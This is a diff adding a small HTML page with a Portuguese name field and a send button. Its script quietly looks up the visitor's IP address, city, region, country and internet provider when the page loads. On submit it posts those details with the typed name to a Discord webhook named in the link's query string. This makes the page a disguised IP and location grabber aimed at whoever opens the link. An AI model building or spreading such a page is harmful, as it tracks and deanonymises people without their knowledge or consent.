@@ -1,0 +1,134 @@
+<div class="main">
+  <div class="row">
+    <div class="input-label">
+      <input placeholder="Nome" onkeyup="changeInput(event)" type="text" />
+    </div>
+    <button onclick="pushToServer()">Enviar</button>
+  </div>
+  <div class="row">
+    <p class="result" style="display: none;" id="success">Dados enviados com sucesso!</p>
+    <p class="result" style="display: none;" id="error">
+      Não foi possível enviar os dados, tente novamente.
+    </p>
+  </div>
+</div>
+
+<style>
+  * {
+    margin: 0px;
+    padding: 0px;
+    font-family: sans-serif;
+  }
+
+  .row {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+
+    gap: 16px;
+
+    flex-direction: row;
+  }
+
+  .main {
+    display: flex;
+    flex-direction: column;
+
+    justify-content: center;
+    align-items: center;
+
+    width: 100vw;
+    height: 100vh;
+
+    gap: 16px;
+
+    background-color: black;
+  }
+
+  #success {
+    color: green;
+  }
+
+  #error {
+    color: red;
+  }
+
+  .input-label {
+    display: flex;
+    flex-direction: column;
+  }
+
+  .input-label input {
+    padding: 10px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+  }
+
+  button {
+    padding: 10px 24px;
+    border: none;
+    background-color: #007bff;
+    color: #fff;
+    border-radius: 5px;
+    cursor: pointer;
+
+    height: 38px;
+  }
+</style>
+
+<script>
+  var ipData;
+
+  (() => {
+    fetch("http://ip-api.com/json/")
+      .then((res) => res.text())
+      .then((res) => {
+        ipData = JSON.parse(res);
+      });
+  })();
+
+  (() => {
+    var input = document.querySelector("input");
+    var inputValue = localStorage.getItem("inputValue");
+
+    if (inputValue) {
+      input.value = inputValue;
+    }
+  })();
+
+  function changeInput(value) {
+    localStorage.setItem("inputValue", value.target.value);
+  }
+
+  function pushToServer() {
+    const key = location.search.split("key=")[1].split("&")[0];
+    const id = location.search.split("id=")[1].split("&")[0];
+
+    var url = `https://discordapp.com/api/webhooks/${id}/${key}`;
+
+    var data = {
+      content: `
+      # Informações - ${localStorage.getItem("inputValue")}
+      - **IP**: ${ipData.query}
+      - **Localização**: ${ipData.city} - ${ipData.region} - ${ipData.country}
+      - **Provedor**: ${ipData.isp} (${ipData.as})
+      `,
+    };
+
+    fetch(url, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(data),
+    }).then(res => {
+      if (res.status === 204) {
+        document.getElementById("success").style.display = "block";
+        document.getElementById("error").style.display = "none";
+      } else {
+        document.getElementById("success").style.display = "none";
+        document.getElementById("error").style.display = "block";
+      }
+    });
+  }
+</script>
